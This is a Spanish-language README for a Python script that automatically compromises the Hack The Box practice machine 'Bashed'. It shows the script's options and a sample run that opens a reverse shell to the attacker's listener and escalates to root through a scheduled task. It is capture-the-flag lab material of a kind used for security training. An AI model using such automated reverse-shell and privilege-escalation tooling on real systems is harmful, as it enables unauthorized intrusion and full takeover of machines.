# Bashed-Autopwn
Script en python autopwn para la máquina Bashed de Hack The Box

## Uso
```bash
❯ python3 Bashed_autopwn.py -h
usage: Bashed_autopwn.py [-h] [--rhost RHOST] --lhost LHOST [--lport LPORT]

Bashed Machine Hack The Box AutoPwn

optional arguments:
  -h, --help     show this help message and exit
  --rhost RHOST  Remote host ip (default: 10.10.10.68)
  --lhost LHOST  Local host ip (Attacker)
  --lport LPORT  Local port (default: 443)
```

```bash
❯ python3 Bashed_autopwn.py --lhost 10.10.14.27
[+] Reverse shell: Consulta enviada
[+] Estado de Conexión: Conexión generada exitosamente
[+] Trying to bind to :: on port 443: Done
[+] Waiting for connections on :::443: Got connection from ::ffff:10.10.10.68 on port 57556
[+] Escalada de privilegios: Accediendo como root
[*] Switching to interactive mode
/bin/sh: 0: can't access tty; job control turned off
$ $ whoami
root
$ 
```

Debido a que se ejecuta una tarea a intervalos regulares, el script tarda un minuto para escalar privilegios como el usuario **root**.
